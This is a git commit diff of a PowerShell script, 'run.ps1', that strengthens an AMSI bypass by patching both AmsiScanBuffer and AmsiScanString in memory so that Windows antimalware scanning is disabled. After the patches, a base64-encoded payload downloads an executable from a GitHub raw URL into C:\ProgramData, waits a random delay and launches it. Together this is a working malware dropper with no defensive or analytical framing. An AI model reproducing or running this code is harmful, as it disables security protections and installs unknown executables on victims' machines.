d46aebe5434fed0152013d1e250e060c7f95d7c9
floorsofolga-svg <floorsofolga@gmail.com>
2026-01-27 23:34:17 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,4 +1,4 @@
-# AMSI Bypass Code
+# Enhanced AMSI Bypass
 Add-Type -Name Win32 -Namespace Native -MemberDefinition @"
 [DllImport("kernel32.dll")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -10,10 +10,19 @@ public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint 
 
 $amsiHandle = [Native.Win32]::GetModuleHandle("amsi.dll")
 $amsiScanBufferPtr = [Native.Win32]::GetProcAddress($amsiHandle, "AmsiScanBuffer")
-$buf = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # Patch to return ERROR_INVALID_PARAMETER
-[uint32]$oldProtect = 0
-[Native.Win32]::VirtualProtect($amsiScanBufferPtr, [uint32]6, 0x40, [ref]$oldProtect)
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $amsiScanBufferPtr, 6)
+$amsiScanStringPtr = [Native.Win32]::GetProcAddress($amsiHandle, "AmsiScanString")
+
+# Patch AmsiScanBuffer
+$bufScanBuffer = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # Return ERROR_INVALID_PARAMETER
+[uint32]$oldProtectBuffer = 0
+[Native.Win32]::VirtualProtect($amsiScanBufferPtr, [uint32]6, 0x40, [ref]$oldProtectBuffer)
+[System.Runtime.InteropServices.Marshal]::Copy($bufScanBuffer, 0, $amsiScanBufferPtr, 6)
+
+# Patch AmsiScanString
+$bufScanString = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # Return ERROR_INVALID_PARAMETER
+[uint32]$oldProtectString = 0
+[Native.Win32]::VirtualProtect($amsiScanStringPtr, [uint32]6, 0x40, [ref]$oldProtectString)
+[System.Runtime.InteropServices.Marshal]::Copy($bufScanString, 0, $amsiScanStringPtr, 6)
 
 # Original Payload Execution
 $encodedPayload = 'JABmAHIAYQBnADMAPQAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZgBsAG8AbwByAHMAbwBmAG8AbABnAGEALQBzAHYAZwAvAHMAaQBnAG4AZQBkAGYAaQBsAGUAcwAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBhAGwAbQBhAGoAZABpAGEAaABfAGUAeAB0AGUAbgBzAGkAbwBuAC4AZQB4AGUAJwA7ACQAZgByAGEAZwA1AD0AJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABwAHIAbwBnAHIAYQBtAC4AZQB4AGUAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGYAcgBhAGcAMwAgAC0ATwB1AHQARgBpAGwAZQAgACQAZgByAGEAZwA1ADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAKABbAE0AYQB0AGgAXQA6ADoAQQBiAHMAKAAoAEcAZQB0AC0AUgBhAG4AZABvAG0AKQAlADEAMAApACsANQApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZgByAGEAZwA1AA=='
